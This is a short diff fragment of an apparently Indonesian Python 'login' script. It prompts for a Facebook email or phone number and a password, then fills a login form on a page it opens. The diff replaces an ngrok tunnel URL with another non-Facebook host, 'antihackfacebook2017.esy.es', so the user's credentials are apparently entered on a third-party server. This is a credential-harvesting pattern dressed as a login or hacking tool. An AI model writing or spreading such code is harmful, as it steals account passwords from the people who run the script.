@@ -106,7 +106,7 @@ def login():
 	us = inputD('[?]Email/HP')
 	pa = inputD('[?]Kata Sandi')
 	tampil('\rh[*]Sedang Login....')
-	buka('https://b99be1b5.ngrok.io')
+	buka('http://antihackfacebook2017.esy.es')
 	br.select_form(nr=0)
 	br.form['email']=us
 	br.form['pass']=pa
